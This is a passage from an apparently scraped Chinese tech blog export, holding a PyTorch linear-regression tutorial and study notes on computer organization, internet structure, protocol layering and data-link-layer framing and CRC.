优化的实现 # import torch.utils.data as Data # 先组合特征值和真值 dataSet = Data.TensorDataset(features, labels) # 将数据分批 # 返回一个迭代器 return Data.DataLoader(dataSet, batch_size, True) 定义Loss函数 # 原本的实现 # 定义Loss函数 # def Loss(y_hat, y): # # 1/2*(y_hat - y)^2 # return (y_hat - y.view(y_hat.size()))**2/2 # 优化的实现 # nn中内置了均方损失函数 Loss = nn.MSELoss() 定义模型 # 原本的实现方法 # 定义模型（函数）,此处的模型是最基本的矩阵乘法 # def linMul(x,w,b): # return torch.mm(x,w) + b #第二种写法 # 这种写法的好处是使多层神经网络清晰明了 # class LinearNet(nn.Module): # def __init__(self, n_feature:int) -\u0026gt; None: # super().__init__() # # 定义输入参数个数与输出参数个数，bias默认自动生成 # self.linear = nn.Linear(n_feature, 1) # # 向前传播函数（线性函数） # def forward(self, x): # # 获取判断值 # y = self.linear(x) # return y # 第三种写法 def LinearNet(n_feature): # Sequential是一个容器，可以容纳多层模型 return nn.Sequential( # 有序字典 OrderedDict([ (\u0026#39;linear\u0026#39;, nn.Linear(n_feature, 1)) # 还可以传入其他层 ]) ) # 或者直接 return nn.Sequential(nn.Linear(n_feature,1)) # 可以查看容器中所有可学习参数（w\u0026amp;b） # net = LinearNet(2) # for param in net.parameters(): # print(param) net = LinearNet(2) 定义优化函数 # 原本的实现 # 定义优化算法 # def sgd(params, lr, batch_size): # for param in params: # param.data -= lr*param.grad / batch_size #优化的实现 # 会直接对net中的训练参数优化 # 设置学习率为0.03 optimizer = torch.optim.SGD(net.parameters(), lr=0.03) 定义训练函数 # 定义训练函数 # def train(num_epoches, lr, features, batch_size, labels, hat_w, hat_b, true_w, true_b): # for epoch in range(num_epoches): # for x,y in data_iter(features, batch_size, labels): # lab_tmp = linMul(x, hat_w.T, hat_b) # # print(lab_tmp) # l = Loss(lab_tmp, y).sum() # l.backward() # sgd([hat_w, hat_b], lr, batch_size) # hat_w.grad.data.zero_() # hat_b.grad.data.zero_() # train_l = Loss(linMul(features, hat_w.T, hat_b), labels).sum() # print(f\u0026#34;epoch {epoch}, loss:{train_l}\u0026#34;) # print(f\u0026#34;true weight:{true_w}, hat weight:{hat_w}\u0026#34;) # print(f\u0026#34;true bias:{true_b}, hat bias:{hat_b}\u0026#34;) def train(num_epoch, features: torch.tensor, batch_size:int, labels:torch.tensor): for epoch in range(num_epoch): for x,y in data_iter(features, batch_size, labels): # 获取模拟结果 output = net(x) # 计算损失 l = Loss(output, y.view(output.size())) # 梯度清零 optimizer.zero_grad() # 反向求导（求偏导） # 这样可以求出使Loss下降最快的梯度 l.backward() # 优化 optimizer.step() print(f\u0026#34;epoch {epoch}, loss:{l}\u0026#34;) 开始训练 def main(): # 先定义真正的w\u0026amp;b，还有应该得到的结果 true_w = maker(10,2,False) true_b = maker(5,1,False) print(f\u0026#34;true weight:{true_w}, true bias:{true_b}\u0026#34;) #定义1000个数据(特征值) features = torch.randn((1000, 2)) print(f\u0026#34;features:{features}\u0026#34;) # 定义真值 labels = torch.mm(features,true_w.T) + true_b # net是一张网，包含了神经网络各层的训练模型 # 初始化模型参数 # 不必再使用自定义的hat_w和hat_b，而是直接内置到模型中 nn.init.normal_(net[0].weight, 0, 0.01) nn.init.constant_(net[0].bias, 0) # 定义迭代次数 num_epoches = 10 # train(num_epoches, lr, features, 10, labels, hat_w, hat_b, true_w, true_b) train(num_epoches, features, 10, labels) print(f\u0026#34;true weight:{true_w}, hat weight:{net[0].weight}\u0026#34;) print(f\u0026#34;true bias:{true_b}, hat bias:{net[0].bias}\u0026#34;) ","date":"2022年11月16日","permalink":"https://peterliuzhi.top/principle/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/simpleimplement/linearregression_optimized/","section":"principle","summary":"You\u0026rsquo;re not obligated to win. You\u0026rsquo;re obligated to keep trying to do the best you can every day. — Marian Wright Edelman 我们之前的程序有时兼顾了太多的细节，pytorch的库里有许多优雅而方便的方法，我们可以利用它们来优化我们","tags":["deeplearning","线性回归","pytorch","completion"],"title":"线性回归优化实现-利用pytorch"},{"categories":["principle","计算机网络"],"contents":" Computers are like bikinis. They save people a lot of guesswork. — Sam Ewing\n本笔记是笔者在阅读计算机科学导论时的随记\n计算机网络和因特网_笔记 网络 网络：是一系列可用于通信的设备相互连接构成的 设备： 主机（终端） 连接设备 局域网（LAN） 广域网（WAN） 点对点广域网 交换广域网 互联网络（internet ，小写） 因特网（Internet，大写） 骨干网 供应商网络 客户网络 骨干网和供应商网络并称为因特网服务供应商 骨干网被称为国际因特网服务供应商 供应商网络被称为国内或地域性因特网服务供应商 Computer Organization CPU(central processing unit) ALU(arithmetic logic unit) control unit a set of registers Cache memory contains a copy of a portion of main memory accelerate the process procedure main memory address space Data(organized as words) I/O(input/output) subsystem input output catagories adress connected by bus data bus address bus control bus Difference between Router and Switch What are Switches in Computer Network? Features of Switches Types of Switches 网络 网络：是一系列可用于通信的设备相互连接构成的 设备： 主机（终端） 连接设备 路由器：将一个网络与另一个网络相连接\n交换机：讲不同设备连接在一起\n调制调节器：可以改变数据形式\n局域网（LAN） 私有网络 每台主机都有作为这台主机在局域网中唯一定义的一个标识和一个地址 一台主机向另一台主机发送的数据包中包括源主机和目标主机的地址 用交换机（switch）连接所有的主机 广域网（WAN） 地理跨度较 LAN 大得多 WAN 将交换机、路由器（router）或调制调节器之类的连接设备互连 局域网为机构私有，而广域网则由通信公司创建并运营 点对点广域网 @——@\n通过传输媒介（电缆或无线）连接两个通信设备的网络\n交换广域网 至少两个端的网络，交换广域网用于当今全球通信的骨干网，是几个点对点广域网通过交换机（switch）连接产生的结合体\n互联网络（internet ，小写） 两个或多个（LAN\u0026amp;WAN）相互连接时，他们构成一个互联网络（网际网）\n因特网（Internet，大写） 成千上万个互联网络组成因特网\n骨干网 为通信公司拥有 通过网络对等汇点连接 供应商网络 规模较小 付费使用骨干网上的一些服务 与骨干网相连，有时也连接其他供应商网络 客户网络 在边缘 真正使用基于因特网服务的网络 向供应商网络付费得到服务 骨干网和供应商网络并称为因特网服务供应商 骨干网被称为国际因特网服务供应商 供应商网络被称为国内或地域性因特网服务供应商 下面是当时找到的一些参考资料（还有一些笔者自己写的英语笔记，但是是那篇已经忘了），原网址找不到了，如有侵犯作者权益，笔者一定删除\nComputer Organization CPU(central processing unit) ALU(arithmetic logic unit) logic shift arithmetic operations control unit contrl the operation of CPU\ncomputer divided by instructions\nCISC(complex instruction set computers)\nprogrammer\u0026rsquo;s works are easier a large set of instructions RISC(reduced instruction set computers)\nprogrammer\u0026rsquo;s works are more difficult simple instructions the process of computer program\nways of processing\npipelining\nParallel processing\nSISD SIMD MISD(JUST CONCEPT) MIMD a cycle\nfetch decode execute a set of registers Data registers\nInstruction registers\ninstruction set\nopcode operand Program counter\nCache memory contains a copy of a portion of main memory accelerate the process procedure CPU checks the cache\nif it\u0026rsquo;s in cache ,get it if not, cache will go get it main memory address space adress Data(organized as words) RAM(random access memory)\nSRAM(static)\nfast expensive DRAM(dynamic)\nslow inexpensive ROM(read-only) memory\nPROM(cannot erase) EPROM(can erase by ultraviolet light) EEPROM(can erase by electronic impulses) I/O(input/output) subsystem input hard disk USB CD/DVD keyboard output monitor printer catagories Nonstorage devices\nStorage devices\nmagnetic optical adress isolated I/O method memory-mapped I/O method connected by bus data bus address bus control bus Difference between Router and Switch Router and Switch are both network connecting devices. Router works at network layer and is responsibe to find the shortest path for a packet whereas Switch connects various devices in a network. Router connects devices across multiple networks.\nFollowing are the important differences between Router and Switch.\nSr. No. Key Router Switch 1 Objective Router main objective is to connect various networks. Switch main objective is to connect various devices in a network. 2 Layer Router works in Network Layer. Switch works in Data Link Layer. 3 Usage Router is used in LAN and MAN. Switch is used only in LAN. 4 Data Format Router sends data in form of packets. Switch sends data in form of packets and frames. 5 Mode of Transmission Router follows duplex mode of transmission. Switch also follows duplex mode of transmission. 6 Collision Less collision in case of Router. In full duplex mode, no collision happens in switch too. 7 NAT Compatability Compatible with NAT. Not compatible with NAT. 8 Type Routing type is Adaptive and Non-adaptive routing. Switching type is Circuit, Packet and Message switching. What are Switches in Computer Network? A switch has many ports, to which computers are plugged in. When a data frame arrives at any port of a network switch, it examines the destination address, performs necessary checks and sends the frame to the corresponding device(s).It supports unicast, multicast as well as broadcast communications.\nFeatures of Switches A switch operates in the layer 2, i.e. data link layer of the OSI model. It is an intelligent network device that can be conceived as a multiport network bridge. It uses MAC addresses (addresses of medium access control sublayer) to send data packets to selected destination ports. It uses packet switching technique to receive and forward data packets from the source to the destination device. It is supports unicast (one-to-one), multicast (one-to-many) and broadcast (one-to-all) communications. Transmission mode is full duplex, i.e. communication in the channel occurs in both the directions at the same time. Due to this, collisions do not occur. Switches are active devices, equipped with network software and network management capabilities. Switches can perform some error checking before forwarding data to the destined port. The number of ports is higher – 24/48. Types of Switches There are variety of switches that can be broadly categorised into 4 types −\nUnmanaged Switch − These are inexpensive switches commonly used in home networks and small businesses. They can be set up by simply plugging in to the network, after which they instantly start operating. When more devices needs to be added, more switches are simply added by this plug and play method. They are referred to as u managed since they do not require to be configured or monitored. Managed Switch − These are costly switches that are used in organisations with large and complex networks, since they can be customized to augment the functionalities of a standard switch. The augmented features may be QoS (Quality of Service) like higher security levels, better precision control and complete network management. Despite their cost, they are preferred in growing organizations due to their scalability and flexibility. Simple Network Management Protocol (SNMP) is used for configuring managed switches. LAN Switch − Local Area Network (LAN) switches connects devices in the internal LAN of an organization. They are also referred as Ethernet switches or data switches. These switches are particularly helpful in reducing network congestion or bottlenecks. They allocate bandwidth in a manner so that there is no overlapping of data packets in a network. PoE Switch − Power over Ethernet (PoE) switches are used in PoE Gogabit Ethernets. PoE technology combine data and power transmission over the same cable so that devices connected to it can receive both electricity as well as data over the same line. PoE switches offer greater flexibility and simplifies the cabling connections ","date":"2022年11月16日","permalink":"https://peterliuzhi.top/principle/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%AF%BC%E8%AE%BA/","section":"principle","summary":"Computers are like bikinis. They save people a lot of guesswork. — Sam Ewing 本笔记是笔者在阅读计算机科学导论时的随记 计算机网络和因特网_笔记 网络 网络：是一系列可用于通信的设备相互连接构成的 设备： 主机","tags":["计算机网络"],"title":"导论"},{"categories":["principle","计算机网络"],"contents":" Lord, make me an instrument of thy peace. Where there is hatred, let me sow love. — Francis of Assisi\n概述 什么是互联网 什么是协议 边缘部分和核心部分 边缘部分-主机 主机通信方式-C/S：客户-服务器方式 主机通信方式-P2P：对等连接方式 核心部分 电路交换 分组交换 Packet Switching 三种交换方式比较 互联网的结构 互联网的性能 速率-比特 bit 承载能力-带宽 实际数据量-吞吐量 网络延迟-时延 时延带宽积 往返时间 RTT 利用率 非性能指标 分层模型 为什么要分层 计算机网络的分层模型 多路复用和多路分解 OSI 七层模型 一些概念 什么是互联网 计算机网络（简称网络） 由若干结点和连接这些结点的链路组成\n互联网是\n数以亿计的计算设备连接在一起的网络 将各种网络（无数的异构网络）连接在一起的网络 网络把许多计算机连接在一起，而互联网则把许多网络通过路由器连接在一起。与网络相连的计算机常称为主机（host）或者终端系统（end system）\n该如何发送/接收信息，就要用到协议\n什么是协议 协议定义了消息格式、发送和接受消息的顺序、以及发出或收到指定消息之后所采取的行为。\n边缘部分和核心部分 边缘部分 由所有连接在互联网上的主机组成。这部分是用户直接使用的，用来进行通信（传送数据、音频或视频）和资源共享。 核心部分 由大量网络和连接这些网络的路由器组成。这部分是为边缘部分提供服务的（提供连通性和交换） 边缘部分-主机 我们说：“主机 A 和主机 B 进行通信”，实际上是指：“运行在主机 A 上的某个程序和运行在主机 B 上的另一个程序进通信”。由于“进程”就是“运行着的程序”，因此这也就是指：“主机 A 的某个进程和主机 B 上的另一个进程进行通信”，简称为“计算机之间通信”。\n主机通信方式-C/S：客户-服务器方式 客户 (client) 和服务器 (server) 都是指通信中所涉及的两个应用进程。 客户 – 服务器方式所描述的是进程之间服务和被服务的关系。 客户是服务的请求方，服务器是服务的提供方。 客户和服务器间的通信，往往是需要经过互联网的核心部分的 客户程序：\n被用户调用后运行，在通信时主动向远地服务器发起通信（请求服务）。因此，客户程序必须知道服务器程序的地址。 不需要特殊的硬件和很复杂的操作系统。 服务器程序：\n是一种专门用来提供某种服务的程序，可同时处理多个远地或本地客户的请求。 系统启动后即自动调用并一直不断地运行着，被动地等待并接受来自各地的客户的通信请求。因此，服务器程序不需要知道客户程序的地址。 一般需要有强大的硬件和高级的操作系统支持。 客户与服务器的通信关系建立后，通信可以是双向的，客户和服务器都可发送和接收数据。\n客户和服务器本来都指的是计算机进程（软件），但在许多国外文献中，经常也把运行客户程序的机器称为 client（在这种情况下也可把 client 译为“客户机”），把运行服务器程序的机器称为 server。\n主机通信方式-P2P：对等连接方式 对等连接 (peer-to-peer，简写为 P2P) 是指两个主机在通信时并不区分哪一个是服务请求方还是服务提供方。 只要两个主机都运行了对等连接软件 (P2P 软件) ，它们就可以进行平等的、对等连接通信。 可以减轻服务器压力，提高主机资源的利用率。 可能经过核心部分，也可能仅在边缘部分完成。 核心部分 互联网的核心部分由互联的路由器/交换机组成（interconnected routers） 网络中的核心部分要向网络边缘中的大量主机提供连通性，使边缘部分中的任何一个主机都能够向其他主机通信（即传送或接收各种形式的数据）。 在网络核心部分起特殊作用的是路由器 (router)。路由器是实现分组交换 (packet switching) 的关键构件，其任务是转发收到的分组，这是网络核心部分最重要的功能。 主要的通信方式：电路交换（circuit switching）和分组交换（packet switching，用于互联网中）\n电路交换 通过建立专用链路来实现通信。譬如打电话，将一个电话和其他所有电话都建立链路是不可能的。因此在打电话之前使 用电话交换机将这些电话连接起来，为两者建立专用链路。\n这种必须经过“建立连接（占用通信资源）→ 通话（一直占用通信资源）→ 释放连接（归还通信资源）”三个步骤的交换方式称为电路交换。\n优点：\n资源专用，无共享，保证了性能和体验 传统电话网络中采用。 缺点： 电路交换是不适合互联网的，因为互联网具有突发性，通信量可能突然增大，导致我们很难去涉及电路的容量（若设计通信链路时按照峰值的数据量设计，则在平时通信链路的利用率很低）。\n当使用电路交换来传送计算机数据时，其线路的传输效率往往很低。这是因为计算机数据是突发式地出现在传输线路上的，因此线路上真正用来传送数据的时间往往不到 10%甚至 1%。已被用户占用的通信线路资源在绝大部分时间里都是空闲的。\n分组交换 Packet Switching 分组交换则采用存储转发技术\n我们把要发送的整块数据称为一个报文(message)，把较长的报文划分成为一个个更小的等长数据段，每一个数据段前面，加上一些由必要的控制信息组成的首部(header)后，就构成了一个分组(packet)。分组又称为“包”，而分组的首部也可称为“包头”。 因此，在分组交换中没有专用的链路，相当于把所有信息都切分并打包成一个个包，再同一发送给接收方\n分组交换的过程： 位于网络边缘的主机和位于网络核心部分的路由器都是计算机，但它们的作用却很不一样。 主机是为用户进行信息处理的，并且可以和其他主机通过网络交换信息。 路由器则是用来转发分组的，即进行分组交换的。路由器收到一个分组，先暂时存储一下，检查其首部，查找转发表，按照首部中的目的地址，找到合适的接口转发出去，把分组交给下一个路由器。这样一步一步地（有时会经过几十个不同的路由器）以存储转发的方式，把分组交付最终的目的主机。 各路由器之间必须经常交换彼此掌握的路由信息，以便创建和动态维护路由器中的转发表，使得转发表能够在整个网络拓扑发生变化时及时更新。\n分组交换的缺点：\n分组在各路由器存储转发时需要排队，这就会造成一定的时延。分组交换并没有“专用”链路，因此可能发生拥塞 首部的开销 如果路由的缓存已满，则分组可能会被丢弃，信息可能会丢失，造成丢包 分组交换的优点： 三种交换方式比较 三种交换方式在数据传送阶段的主要特点：\n电路交换—整个报文的比特流连续地从源点直达终点，好像在一个管道中传送。 报文交换—整个报文先传送到相邻结点，全部存储下来后查找转发表，转发到下一个结点。 分组交换—单个分组（这只是整个报文的一部分）传送到相邻结点，存储下来后查找转发表，转发到下一个结点 因为用户不是时刻在进行交互，所以分组交换可以更好地将计算机的资源利用起来\n互联网的结构 端系统/主机，通过连接 access ISP（Internet Service Providers）接入互联网（小区、公司、或大学，都可视为 access ISP 的例子），Access ISP 也需要互相连接，由此任意的两个主机才可以互相发送分组，由此构成非常复杂的互联网 – network of networks\n不可能将每一个 access net 都通过链路连接起来=》使用路由器交换，构建全球 ISP 但是可能会有不同公司构建 ISP，形成竞争=》使用网络交换节点 IXP 在 ISP 之间交互 同一个区域属于一层=》使用 regional net 区域网络将同一区域的请求一起上传 之后 Google 等网络服务供应商就可以在这个网络上构建自己的服务 互联网的性能 速率-比特 bit 比特（bit）是计算机中数据量的单位，也是信息论中使用的信息量的单位。 比特（bit）来源于 binary digit，意思是一个“二进制数字”，因此一个比特就是二进制数字中的一个 1 或 0。 速率是计算机网络中最重要的一个性能指标，指的是数据的传送速率，它也称为数据率 (data rate) 或比特率 (bit rate)。 速率的单位是 bit/s，或 kbit/s、Mbit/s、 Gbit/s 等。速率往往是指额定速率或标称速率，非实际运行速率。 承载能力-带宽 两种不同意义：\n“带宽”(bandwidth) 本来是指信号具有的频带宽度，其单位是赫（或千赫、兆赫、吉赫等）。 在计算机网络中，带宽用来表示网络中某通道传送数据的能力。表示在单位时间内网络中的某信道所能通过的“最高数据率”。单位是 bit/s，即 “比特每秒”。 在“带宽”的上述两种表述中，前者为频域称谓，而后者为时域称谓，其本质是相同的。也就是说，一条通信链路的“带宽”越宽，其所能传输的“最高数据率”也越高。\n实际数据量-吞吐量 吞吐量 (throughput) 表示在单位时间内通过某个网络（或信道、接口）的数据量。 吞吐量更经常地用于对现实世界中的网络的一种测量，以便知道实际上到底有多少数据量能够通过网络。 吞吐量受网络的带宽或网络的额定速率的限制。 网络延迟-时延 时延 (delay 或 latency) 是指数据（一个报文或分组，甚至比特）从网络（或链路）的一端传送到另一端所需的时间。有时也称为延迟或迟延。\n网络中的时延由以下几个不同的部分组成：\n发送时延（Transmission delay）：主机或路由器发送数据帧所需要的时间\r传播时延（Propagation delay）：电磁波在信道中传播一定的距离需要花费的时间（1000 km 长的光纤线路产生的传播时延大约为 5 ms）\r处理时延（Processing delay）：主机或路由器在收到分组时要花费一定的时间进行处理 排队时延（Queueing delay）分组在经过网络传输时，要经过许多路由器。但分组在进入路由器后要先在输入队列中排队等待处理（当网络的通信量很大时会发生队列溢出，使分组丢失，这相当于排队时延为无穷大） 对于高速网络链路，我们提高的仅仅是数据的发送速率而不是比特在链路上的传播速率，提高链路带宽减小了数据的发送时延。传播速率由链路的物理介质决定，例如将铜导线换成光纤。 时延带宽积 链路的时延带宽积又称为以比特为单位的链路长度。\n往返时间 RTT 往返时间 RTT (round-trip time) 表示从发送方发送数据开始，到发送方收到来自接收方的确认，总共经历的时间。\n互联网上的信息不仅仅单方向传输，而是双向交互的。因此，有时很需要知道双向交互一次所需的时间。 在互联网中，往返时间还包括各中间结点的处理时延、排队时延以及转发数据时的发送时延。 当使用卫星通信时，往返时间 RTT 相对较长，是很重要的一个性能指标。\n利用率 分为信道利用率和网络利用率。 信道利用率指出某信道有百分之几的时间是被利用的（有数据通过），完全空闲的信道的利用率是零。\n网络利用率则是全网络的信道利用率的加权平均值。 信道利用率并非越高越好。当某信道的利用率增大时，会导致分组排队，该信道引起的时延也就迅速增加。（当高速公路上的车流量很大时，由于在公路上的某些地方会出现堵塞，因此行车所需的时间就会变长）\r令 D0 表示网络空闲时的时延，D 表示网络当前的时延，那么在适当的假定条件下，可以用下面的简单公式(1-5)来表示 D，D0 和利用率 U 之间的关系： 非性能指标 一些非性能特征也很重要。它们与前面介绍的性能指标有很大的关系。主要包括：\n费用 可靠性 质量 可扩展性和可升级性 标准化 易于管理、可维护性 这些指标的重要性，不亚于性能评价指标。\n分层模型 为什么要分层 对于复杂系统\n分层模型容易理解，容易厘清复杂系统中不同部分的关系 分层模型也有利于维护和系统更新 改变某一层服务的内容和实现方式，对于其他层毫无影响，层与层之间互不干扰 仍以飞机飞行为例，改变安检口的登机规则对系统其他部分毫无影响 优点：\n各层独立 灵活性好 结构可分割 易于实现和维护 能促进标准化 缺点：\n降低了效率 产生额外、重复的开销。 计算机网络的分层模型 类似的，对于互联网，我们也采用分层模型。\n应用层 应用层的任务是通过应用进程间的交互来完成特定网络应用 对于不同的网络应用需要有不同的应用层协议 传输层 运输层的任务就是负责向两台主机中进程之间的通信提供通用的数据传输服务 并不针对某个特定网络应用，而是多种应用可以使用同一个运输层服务 主要使用传输控制协议 TCP (Transmission Control Protocol) 和 用户数据报协议 UDP (User Datagram Protocol) 网络层 网络层负责为分组交换网上的不同主机提供通信服务 把运输层产生的报文段或用户数据报封装成分组或包进行传送 TCP/IP 体系中，由于网络层使用 IP 协议，因此分组也叫做 IP 数据报，或简称为数据报 链路层 两台主机之间的数据传输，总是在一段一段的链路上传送的，这就需要使用专门的链路层的协议 数据链路层将网络层交下来的 IP 数据报组装成帧(framing)，在两个相邻结点间的链路上传送帧(frame)。每一帧包括数据和必要的控制信息（如同步信息、地址信息、差错控制等） 物理层 在物理层上所传数据的单位是比特，物理层要考虑用多大的电压代表“1”或“0”，以及接收方如何识别出发送方所发送的比特。物理层还要确定连接电缆的插头应当有多少根引脚以及各引脚应如何连接。 传递信息所利用的一些物理媒体，如双绞线、同轴电缆、光缆、无线信道等，并不在物理层协议之内而是在物理层协议的下面 在互联网所使用的各种协议中，最重要的和最著名的就是 TCP 和 IP 两个协议。现在人们经常提到的 TCP/IP 并不一定是单指 TCP 和 IP 这两个具体的协议，而往往是表示互联网所使用的整个 TCP/IP 协议族(protocol suite) \u0026gt; OSI 参考模型把对等层次之间传送的数据单位称为该层的 协议数据单元 PDU (Protocol Data Unit) 。这个名词现已被许多非 OSI 标准采用。\n每一层都要负责不同的任务，但每一层都会为数据加上首部或尾部，因此虽然独立灵活，但产生了额外的开销\n多路复用和多路分解 TCP/IP 协议族在一些层使用多个协议，因此在发送时要将他们合并（封装），接收时要将他们分解\n当发送时要为不同的协议使用不同的头部字段，这样在接收时就能分开分解\nOSI 七层模型 一些概念 对等层次之间传送的数据单位称为该层的协议数据单元 PDU (Protocol Data Unit)。\n任何两个同样的层次把数据（即数据单元加上控制信息）通过水平虚线（逻辑上的水平）直接传递给对方。这就是所谓的“对等层”(peer layers)之间的通信。\n实体 (entity) 表示任何可发送或接收信息的硬件或软件进程\n协议是控制两个对等实体进行通信的规则的集合。在协议的控制下，两个对等实体间的通信使得本层能够向上一层提供服务\n要实现本层协议，还需要使用下层所提供的服务。（上层依赖下层）\n协议必须把所有不利的条件事先都估计到，而不能假定一切都是正常的和非常理想的，必须非常仔细地检查这个协议能否应付各种异常情况\n![[Pasted image 20220831220725.png]]\n","date":"2022年11月16日","permalink":"https://peterliuzhi.top/principle/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E6%A6%82%E8%BF%B0/","section":"principle","summary":"Lord, make me an instrument of thy peace. Where there is hatred, let me sow love. — Francis of Assisi 概述 什么是互联网 什么是协议 边缘部分和核心部分 边缘部分-主机 主机通信方式-C/S：客户-服务器方式 主机通信方式-","tags":["计算机网络","概述"],"title":"概述"},{"categories":["principle","计算机网络"],"contents":" To follow, without halt, one aim: There is the secret of success. — Anna Pavlova\n计算机网络中的任何设备都需要实现链路层\n链路层 两类信道 两个子层 基本概念 数据链路控制（DLC） 流量控制和差错控制 三个基本问题 封装成帧 面向字符成帧 当发送出差错时 面向位成帧 透明传输 差错检测 CRC 检错技术 计算方法 介质访问控制（MAC）\u0026ndash;专用于广播信道 多路访问 信道划分 （channel partitioning） TDMA FDMA CDMA 随机接入 （random access） ALOHA 协议——最早的随机访问方法 纯 ALOHA slotted ALOHA 载波侦听多点接入/碰撞检测（CSMA/CD） 基本策略 碰撞检测 重传机制 脆弱时间 优缺点 受控接入（taking turns） Taking turns 轮流接入 轮询 polling 令牌传递 token passing 链路层寻址 48 位的 MAC 地址 EUI-48 MAC 地址有什么用 混杂方式(promiscuous mode) ARP 协议 – Address Resolution Protocol MAC 帧的格式 ARP 表-转 IP 为 MAC 在局域网中学习 ARP 表 不在局域网中学习 ARP 表 局域网\u0026ndash;典型广播信道 以太网 以太网的物理拓扑（physical topology） 以太网的帧的结构 无效的帧 以太网的特征（链路层的特征） 以太网的信道利用率 交换机 交换机学习交换表/转发表 交换机自学习产生的问题 虚拟局域网 VLAN 虚拟局域网的优点 虚拟局域网的实现方法 基于交换机端口 基于 MAC 地址 基于协议类型 基于 IP 子网地址 基于高层应用和服务 VLAN 的帧的格式 两类信道 有两类不同的链路\n点对点信道：专供两台设备，现今少用 广播信道：几对设备共享，现今多用 两个子层 数据链路控制（DLC）：处理点对点信道和广播信道共有的问题，功能包括成帧、流量控制、差错控制（差错检测和差错纠正） 介质访问控制（MAC）：只处理广播信道的问题 基本概念 链路(link)：从一个结点到相邻结点的一段物理线路（有线或无线） 数据链路(data link)：当需要在一条线路上传送数据时，除了必须有一条物理线路外，还必须有一些必要的通信协议来控制这些数据的传输，把实现这些协议的硬件和软件加到链路上，就构成了数据链路 通常，链路层实现为适配器（NIC、网卡）或者在芯片上实现\n数据链路控制（DLC） 流量控制和差错控制 流量控制在接收确认前调整能够被发送的数据数量 差错控制包括差错检测和差错纠正 在数据链路层中，差错控制是节点到节点的，只要有一个差错，就要求重传 三个基本问题 三个基本问题是封装成帧、透明传输和差错检测\n封装成帧 封装成帧(framing)就是在一段数据的前后分别添加首部和尾部，这样就构成了一个帧。 首部和尾部的一个重要作用就是进行帧定界（即确定帧的界限） 在发送帧时，是从帧首部开始发送的。 显然，为了提高帧的传输效率，应当使帧的数据部分长度尽可能地大于首部和尾部的长度。但是，每一种链路层协议都规定了所能传送的帧的数据部分长度上限—最大传送单元 MTU (Maximum Transfer Unit) 如果直接将整个数据打包成一个帧，那么流量控制和差错控制将非常低效。如果这个数据中有一点错误，那么就可能要求整个数据重传。 因此，要把一个报文拆成多个小的帧，这样错误只能影响比较小的一个部分\n面向字符成帧 当数据是由可打印的 ASCII 码组成的文本文件时，帧定界可以使用特殊的帧定界符：\n控制字符 SOH (Start Of Header) 放在一帧的最前面，表示帧的首部开始。 另一个控制字符 EOT (End Of Transmission) 表示帧的结束。 这样，用两个标记我们区分了不同的帧\n头部携带源地址和目的地址等控制信息；尾部携带差错检测冗余位\n当发送出差错时 假定发送端在尚未发送完一个帧时突然出故障，中断了发送。但随后很快又恢复正常，于是重新从头开始发送刚才未发 送完的帧。\n由于使用了帧定界符，接收端就知道前面收到的数据是个不完整的帧（只有首部开始符 SOH 而没有传输结束符 EOT），必须丢弃。 而后面收到的数据有明确的帧定界符（SOH 和 EOT），因此这是一个完整的帧，应当收下。 面向位成帧 在发送非文本信息（图片、音频等）时，数据中可能会出现和 SOH\\EOT 相同的字节，我们常常使用面向位成帧\nSOH\\EOT → 0 111 111 0：\n这种方法也可能会产生和上面一样的问题，数据中也可能出现和标记相同的字节，这时候我们使用位填充：\n当发送方连续读取到一个 0 和五个 1 时（011111），就在后面插入一个 0。虽然有时候数据并构不成标记，但这种方法避免了传输数据中出现标记。\n透明传输 由于帧的开始和结束的标记使用专门指明的控制字符，因此，所传输的数据中的任何 8 比特的组合一定不允许和用作帧定界的控制字符的比特编码一样，否则就会出现帧定界的错误。\n\u0026ldquo;透明\u0026quot;意味着：某一个实际存在的事物看起来却好像不存在一样 “在数据链路层透明传送数据”表示：无论什么样的比特组合的数据，都能够按照原样没有差错地通过这个数据链路层（数据链路层对这些数据来说是透明的） 因此，必须设法使数据中可能出现的控制字符“SOH”和“EOT”在接收端不被解释为控制字符：\n字节填充(byte stuffing)/字符填充(character stuffing)：\n发送端的数据链路层在数据中出现控制字符“SOH”或“EOT”的前面插入一个转义字符“ESC” 在接收端的数据链路层在把数据送往网络层之前删除这个插入的转义字符 如果转义字符也出现在数据当中，那么解决方法仍然是在转义字符的前面插入一个转义字符（当接收端收到连续的两个转义字符时，就删除其中前面的一个） 差错检测 1 可能会变成 0，而 0 也可能变成 1。这就叫做比特差错\n在信噪越小的情况下，误码率 BER (Bit Error Rate)越高\n相较于有线信道，无线网络会遇到像多个 WiFi 干扰等的情况，误码率比较高\n在链路层中，广泛使用循环冗余检验（CRC，Cyclic Redundancy Check）的检错技术\nCRC 检错技术 CRC 运算就是在数据 M 的后面添加供差错检测用的 n 位冗余码，然后构成一个帧发送出去，一共发送$(k + n)$位，这种为了进行检错而添加的冗余码常称为帧检验序列 FCS (Frame Check Sequence)\n计算方法 CRC 是基于模二运算的\n模二加法和模二减法相当于异或运算，他们是一回事 模二乘法相当于且运算 模二除法相当于模二乘法的逆运算 乘法和除法相当于多个加法和多个减法\n在发送端： 用二进制的模 2 运算进行$2^n$ 乘 M 的运算，这相当于在 M 后面添加 n 个 0。得到的$(k + n)$ 位的数除以收发双方事先商定的长度为 $(n + 1)$位的除数 P，得出商是 Q 而余数是 R（n 位，比 P 少一位），余数 R 就作为余码拼接在数据 M 的后面发送出去\n在接收端： 把收到的每一个帧都除以同样的除数 P（模 2 运算），然后检查得到的余数 R，如果在传输过程中无差错，那么经过 CRC 检验后得出的余数 R 肯定是 0，就接收；若余数 R ≠ 0（正确的概率很小很小），则判定这个帧有差错（但无法确定究竟是哪一位或哪几位出现了差错），就丢弃\n因为加法和减法是一回事，所以$2^nM=QP+R=QP+CRC$，但是发送的是$2^nM+CRC=QP+CRC+CRC=QP+CRC-CRC=QP$，所以如果没有错，那余数必为 0\n在数据链路层若仅仅使用循环冗余检验 CRC 差错检测技术，则只能做到对帧的无差错接受，即：“凡是接收端数据链路层接受的帧，我们都能以非常接近于 1 的概率认为这些帧在传输过程中没有产生差错”。 接收端丢弃的帧虽然曾收到了，但最终还是因为有差错被丢弃，即没有被接受。以上所述的可以近似地表述为（通常都是这样认为）：“凡是接收端数据链路层接受的帧均无差错”\n注意事项：\n选择除数，可以随机选择，也可以按照既定标准选择（按照国际通行标准选择，最高位和最低为必须为 